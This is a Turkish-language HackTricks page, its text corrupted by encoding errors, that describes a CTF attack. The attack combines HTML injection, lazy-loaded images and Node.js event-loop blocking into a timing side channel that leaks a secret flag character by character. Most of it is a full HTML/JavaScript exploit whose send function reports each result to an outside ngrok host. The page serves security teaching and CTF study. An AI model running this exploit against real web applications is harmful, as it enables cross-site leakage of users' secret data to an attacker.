# Olay DÃ¶ngÃ¼sÃ¼ Engelleme + Tembel Resimler

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te** reklamÄ±nÄ± gÃ¶rmek ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**'ya PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

[**Bu saldÄ±rÄ±da**](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45), [**@aszx87410**](https://twitter.com/aszx87410) **tembel resim yan kanal** tekniÄŸini HTML enjeksiyonu ile birleÅŸtirerek **olay dÃ¶ngÃ¼sÃ¼ engelleme tekniÄŸi** kullanarak karakter sÄ±zdÄ±rÄ±r.

Bu, zaten aÅŸaÄŸÄ±daki sayfada yorumlanan bir CTF zorluk iÃ§in **farklÄ± bir saldÄ±rÄ±dÄ±r**. Daha fazla bilgi iÃ§in zorluk hakkÄ±nda aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Bu saldÄ±rÄ±nÄ±n arkasÄ±ndaki fikir ÅŸudur:

* GÃ¶nderiler alfabetik olarak yÃ¼klenir.
* Bir **saldÄ±rgan**, **"A"** ile baÅŸlayan bir **gÃ¶nderi** enjekte edebilir, ardÄ±ndan biraz **HTML etiketi** (bÃ¼yÃ¼k bir **`<canvas`**) Ã§oÄŸu **ekranÄ± dolduracak** ve bazÄ± son **`<img lazy` etiketleri** ÅŸeyleri yÃ¼klemek iÃ§in.
* SaldÄ±rgan, yerine "A" ile baÅŸlayan aynÄ± gÃ¶nderiyi enjekte ederse. **Bayrakla birlikte** **gÃ¶nderi** Ã¶nce gÃ¶rÃ¼necek, ardÄ±ndan **enjekte edilen** **gÃ¶nderi** "z" ile baÅŸlayacak ve **bÃ¼yÃ¼k** **canvas** gÃ¶rÃ¼necektir. Bayrakla birlikte gÃ¶nderi Ã¶nce gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ iÃ§in, ilk canvas tÃ¼m ekranÄ± kaplayacak ve enjekte edilen **son** **`<img lazy`** etiketleri ekranÄ±nda gÃ¶rÃ¼nmeyeceÄŸi iÃ§in yÃ¼klenmeyecektir.
* ArdÄ±ndan, bot sayfaya eriÅŸirken, saldÄ±rgan **fetch istekleri gÃ¶nderecektir**.&#x20;
* EÄŸer gÃ¶nderiye enjekte edilen **resimler yÃ¼kleniyorsa**, bu **fetch** istekleri daha **uzun sÃ¼recektir**, bu nedenle saldÄ±rgan gÃ¶nderinin bayraktan **Ã¶nce** olduÄŸunu bilir (alfabetik olarak).
* EÄŸer **fetch** istekleri **hÄ±zlÄ±** ise, bu, gÃ¶nderinin bayraktan **sonra** alfabetik olarak olduÄŸu anlamÄ±na gelir.

Kodu kontrol edelim:
```html
<!DOCTYPE html>
<html>
<!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
-->
<body>
<button onclick="run()">start</button>

<!-- Inject post with payload -->
<form id=f action="http://localhost:1234/create" method="POST" target="_blank">
<input id=inp name="text" value="">
</form>

<!-- Remove index -->
<form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
<input id=inp2 name="index" value="">
</form>

<script>
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms => new Promise(r => setTimeout(r, ms))
// Function to leak info to attacker
const send = data => fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () => {
let L = 0
let R = charset.length - 1

// I have omited code here as apparently it wasn't necesary

// fallback to linerar since I am not familiar with binary search lol
for(let i=R; i>=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve => {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
// <canvas height="3350px"> is experimental and allow to show the injected
// images when the post injected is the first one but to hide them when
// the injected post is after the post with the flag
inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
f.submit()

setTimeout(() => {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// Open posts page 5 times
for(let i=1; i<=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30 //Lets time 30 requests
setTimeout(async () => {
// Send 30 requests and time each
for(let i=0; i<round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=>1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
// Send info about how much time it took
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t >= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() => {
resolve(isFound)
}, 200)
}, 200)
}

</script>
</body>
</html>
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da beni takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
